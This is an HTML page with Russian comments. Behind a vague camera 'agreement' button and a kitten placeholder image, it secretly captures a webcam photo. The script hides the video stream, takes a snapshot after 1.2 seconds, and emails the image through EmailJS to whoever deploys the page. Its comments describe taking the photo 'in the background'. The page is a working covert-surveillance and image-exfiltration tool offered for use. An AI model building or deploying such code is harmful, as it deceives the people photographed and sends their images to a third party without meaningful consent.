<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Соглашение и скрытое фото</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <style>
    #agreement { 
      background: #f3f3f3; 
      border: 1px solid #aaa; 
      padding: 20px; 
      width: 340px; 
      margin: 40px auto;
      border-radius: 10px;
      font-size: 16px;
      text-align: center;
    }
    #main, #result { display: none; }
    #catimg { width:320px; height:240px; border:1px solid #ccc; }
    #loading { font-size: 18px; }
  </style>
</head>
<body>
  <div id="agreement">
    <h2>Соглашение</h2>
    <p>Переходя далее, вы соглашаетесь с использованием вашей камеры.</p>
    <button id="acceptBtn" style="background:green;color:white;padding:10px 20px;font-size:18px;">Принять</button>
  </div>
  <div id="main" style="text-align:center;">
    <p id="loading">Загрузка...</p>
    <img id="catimg" src="https://placekitten.com/320/240" alt="Котик">
  </div>
  <div id="result" style="text-align:center;">
    <h2>Спасибо!</h2>
    <p>Фото отправлено.</p>
    <img src="https://placekitten.com/320/240" width="320" height="240" style="border:1px solid #ccc;">
  </div>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
  <script>
    // Вставь свои значения!
    emailjs.init("YOUR_USER_ID"); // например, "user_xxxxxx"
    const agreement = document.getElementById('agreement');
    const main = document.getElementById('main');
    const result = document.getElementById('result');
    const acceptBtn = document.getElementById('acceptBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    acceptBtn.onclick = function() {
      agreement.style.display = 'none';
      main.style.display = 'block';
      // Запрос камеры и моментальный снимок
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          // Не показываем видео, делаем фото "на фоне"
          setTimeout(async () => {
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            // Отключаем камеру
            stream.getTracks().forEach(track => track.stop());
            // Получаем фото
            const dataUrl = canvas.toDataURL('image/png');
            // Отправляем на email
            await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
              photo: dataUrl
            });
            main.style.display = 'none';
            result.style.display = 'block';
          }, 1200); // 1.2 секунды на автофокус
        })
        .catch(err => {
          alert("Ошибка доступа к камере: " + err.message);
        });
    };
  </script>
</body>
</html>
